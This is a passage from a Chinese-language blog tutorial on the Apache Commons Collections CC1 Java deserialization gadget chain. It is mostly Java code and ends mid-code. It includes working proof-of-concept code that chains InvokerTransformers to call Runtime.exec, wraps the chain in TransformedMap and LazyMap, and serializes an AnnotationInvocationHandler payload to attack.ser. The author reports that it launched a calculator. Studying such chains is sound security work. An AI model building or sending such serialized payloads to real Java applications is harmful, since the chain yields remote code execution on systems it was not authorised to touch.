punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>var8<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> var8 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Method<span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>发现在里面有赋值操作<strong>var5.setValue</strong>，不管它值是什么总之只要赋值就能执行我们的命令。<br>由于<strong>AnnotationInvocationHandler</strong>类的构造函数的第一个参数继承<strong>Annotation</strong>，所以第一个变量可以在改包底选一个，即可。<br>同时发现<strong>var3</strong>里面有一组map数据，会把用户输入的<strong>map</strong>数据的每一组<strong>key</strong>值在其<strong>var3</strong>在寻找有无<strong>key</strong>值有则不为空，进入判断则可执行</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Documented<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Map</span>        Map map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map1 <span class="token operator">=</span> TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> null<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        Class <span class="token class-name">cls</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor ct <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o <span class="token operator">=</span> ct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//payload序列化</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Target.class是因为第一个参数规定了泛型，必须是Annotation的实现。对着Annotation接口ctrl+alt+b即可搜索实现。<br>而且，这里<code>map.put("value", "key");</code>第一个参数必须为value，具体分析可见<a href="https://www.cnblogs.com/kingbridge/articles/16141397.html">Java反序列化学习–从URLDNS到CommonsCollections1-7</a>。<br><img src="https://kingofkb.github.io/medias/image/20220721/calc5.png"><br>成功调出计算器。</p><h3 id="Lacymap类"><a href="#Lacymap类" class="headerlink" title="Lacymap类"></a>Lacymap类</h3><p>看看Lazymap类，发现其get函数在获取key所对应的数据时，如果当key不存在，则调用transform函数，并把执行结果作为该key所对应的数据，并添加到到map里面。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Map <span class="token function">decorate</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">protected</span> <span class="token function">LazyMap</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Factory factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Factory must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>factory <span class="token operator">=</span> FactoryTransformer<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> Object <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>发现其<strong>get</strong>函数在获取<strong>key</strong>所对应的数据时，如果当<strong>key</strong>不存在，则调用<strong>transform</strong>函数，并把执行结果作为该<strong>key</strong>所对应的数据，并添加到到<strong>map</strong>里面。<br>改payload</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Documented<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Map</span>        Map map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>        map1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220721/calc6.png"></p><h3 id="动态处理"><a href="#动态处理" class="headerlink" title="动态处理"></a>动态处理</h3><p>对一段代码进行分析，程序执行了<strong>invoke</strong>方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">expHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> Map map<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">expHandler</span><span class="token punctuation">(</span>Map map<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>map <span class="token operator">=</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token string">"put"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hook Method: "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">,</span> <span class="token string">"xd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">expHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        proxyMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">,</span> <span class="token string">"sir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>发现输出的结果是先去执行invoke，当匹配不到，则按正常执行<br>AnnotationInvocationHandler类其实和InvocationHandler差不多里都有invoke，AnnotationInvocationHandler类下的invoke里面使用的get函数，所以从这块切入。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Documented<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token 